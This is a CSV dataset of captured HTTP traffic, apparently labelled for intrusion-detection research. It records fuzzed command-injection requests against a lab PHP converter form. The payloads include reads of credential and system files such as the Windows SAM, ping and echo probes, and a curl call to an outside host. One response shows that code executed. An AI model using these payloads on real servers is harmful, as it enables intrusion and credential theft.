attack_tag,dst_ip,dst_port,req_body,req_header_Accept,req_header_Content_Length,req_header_Content_Type,req_header_Host,req_header_User_Agent,req_method,req_url,res_body,res_header_Connection,res_header_Content_Length,res_header_Content_Type,res_header_Date,res_header_Response_Code,res_header_Server,src_ip,src_port
cmdinj,192.168.1.34,80,,*/*,,,192.168.1.34,curl/7.82.0,GET,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:02 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61346
cmdinj,192.168.1.34,80,ytlink=&&type C:\\boot.ini&send=send,*/*,36,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:31 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61348
cmdinj,192.168.1.34,80,ytlink=&& type C:\Windows\repair\SAM&send=send,*/*,46,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:13 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61349
cmdinj,192.168.1.34,80,ytlink=%0a ping -i 30 127.0.0.1 %0a&send=send,*/*,45,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"uid=33(www-data) gid=33(www-data) groups=33(www-data)   <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",,333,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:06 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61350
cmdinj,192.168.1.34,80,ytlink=%22%7C%7Cecho%20HUGKZQ$((0%2B67))$(echo%20HUGKZQ)HUGKZQ\&send=send,*/*,73,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:39 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61351
cmdinj,192.168.1.34,80,ytlink=`ping 127.0.0.1`&send=send,*/*,33,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:24 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61352
cmdinj,192.168.1.34,80,ytlink=\necho INJECTX\nexit\n\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt\n&send=send,*/*,98,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:18 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61353
cmdinj,52.85.49.22,80,,*/*,,,crowdshield.com,curl/7.81.0,GET,http://crowdshield.com/.testing/rce.txt,<html> <head><title>301 Moved Permanently</title></head> <body> <center><h1>301 Moved Permanently</h1></center> <hr><center>CloudFront</center> </body> </html> ,keep-alive,167,text/html,"Sat, 04 Feb 2023 15:56:12 GMT",301,CloudFront,192.168.1.34,42698
cmdinj,192.168.1.34,80,ytlink=%20echo%20FPVLKT$((63%2B87))$(echo%20FPVLKT)FPVLKT%22&send=send,*/*,70,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:35 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61359
cmdinj,192.168.1.34,80,ytlink=%26%26echo%20FFQWQY$((35%2B58))$(echo%20FFQWQY)FFQWQY%7C&send=send,*/*,73,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:35 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61361
